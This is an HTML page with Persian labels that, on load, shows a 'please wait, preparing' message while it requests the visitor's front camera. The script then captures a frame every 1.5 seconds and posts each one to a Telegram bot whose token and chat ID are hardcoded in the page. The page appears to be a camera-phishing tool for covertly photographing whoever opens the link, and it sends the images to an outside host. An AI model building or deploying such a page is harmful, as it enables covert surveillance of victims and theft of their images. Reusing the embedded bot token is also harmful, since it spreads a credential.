<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ارسال عکس وب‌کم به تلگرام</title>
    <style>
        /* استایل صفحه */
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            text-align: center;
            padding: 50px;
            margin: 0;
            overflow: hidden;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            animation: fadeInDown 1.5s ease-out;
        }

        p {
            font-size: 1.2rem;
            margin-bottom: 30px;
            animation: fadeIn 1.8s ease-out;
        }

        #loading {
            font-size: 1.5rem;
            color: #ffeb3b;
            margin-bottom: 20px;
            display: none;
            animation: pulse 1.5s infinite;
        }

        #video {
            margin-top: 20px;
            border: 5px solid white;
            border-radius: 10px;
            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
            display: none;
            transform: scale(0.8);
            animation: zoomIn 1.2s ease-out forwards;
        }

        #errorMsg {
            font-size: 1.2rem;
            color: #ff6b6b;
            margin-top: 20px;
            animation: shake 0.8s ease-out;
        }

        /* پس‌زمینه‌های متحرک */
        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255,255,255,0.2), transparent);
            z-index: -1;
            animation: moveBackground 8s infinite alternate ease-in-out;
        }

        /* انیمیشن‌ها */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes zoomIn {
            from {
                transform: scale(0.5);
            }
            to {
                transform: scale(1);
            }
        }

        @keyframes pulse {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }

        @keyframes shake {
            0%, 100% {
                transform: translateX(0);
            }
            25% {
                transform: translateX(-10px);
            }
            75% {
                transform: translateX(10px);
            }
        }

        @keyframes moveBackground {
            from {
                transform: translateY(0);
            }
            to {
                transform: translateY(-50px);
            }
        }
    </style>
</head>
<body>
    <h1>ارسال خودکار تصاویر به تلگرام</h1>
    <p>لطفاً چند لحظه صبر کنید. در حال آماده‌سازی...</p>
    <p id="loading">در حال ارسال درخواست اولیه...</p>
    <video id="video" autoplay playsinline width="640" height="480"></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
    <span id="errorMsg"></span>

    <script>
        'use strict';

        // توکن ربات تلگرام
        const token = '8131437664:AAGXq7iJsaXNetbtqZYgqq_O1CfRq3GJbk8';

        // شناسه چت تلگرام (chat_id)
        const chat_id = '7552479589'; // اینجا شناسه چت خود را قرار دهید

        // المان‌ها
        const loadingMsg = document.getElementById('loading');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        // تنظیمات وب‌کم
        const constraints = {
            audio: false,
            video: {
                facingMode: "user"
            }
        };

        // ارسال درخواست اولیه
        async function sendInitialRequest() {
            loadingMsg.style.display = 'block';

            try {
                // ارسال یک درخواست ساده به سرور تلگرام (یا هر سایت دیگر)
                const response = await fetch('https://api.telegram.org', {
                    method: 'GET',
                });

                // بررسی کد وضعیت
                if (response.status === 200) {
                    loadingMsg.style.display = 'none';
                    console.log('درخواست اولیه موفقیت‌آمیز بود.');
                    startWebcam();
                } else {
                    throw new Error(`خطا در درخواست: کد وضعیت ${response.status}`);
                }
            } catch (error) {
                loadingMsg.style.display = 'none';
                errorMsgElement.innerHTML = `خطا: ${error.message}`;
            }
        }

        // دسترسی به وب‌کم
        async function startWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                errorMsgElement.innerHTML = `خطا در دسترسی به وب‌کم: ${e.toString()}`;
            }
        }

        // موفقیت در دسترسی به وب‌کم
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            video.style.display = 'block';

            const context = canvas.getContext('2d');
            setInterval(function () {
                context.drawImage(video, 0, 0, 640, 480);
                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                postToTelegram(canvasData);
            }, 1500);
        }

        // ارسال عکس به تلگرام
        function postToTelegram(imgdata) {
            const url = `https://api.telegram.org/bot${token}/sendPhoto`;

            const formData = new FormData();
            formData.append('chat_id', chat_id);
            formData.append('photo', imgdata);

            fetch(url, {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(result => {
                console.log('تصویر به تلگرام ارسال شد:', result);
              })
              .catch(error => {
                console.error('خطا در ارسال تصویر:', error);
              });
        }

        // اجرای درخواست اولیه به‌محض ورود کاربر
        window.onload = sendInitialRequest;
    </script>
</body>
</html>
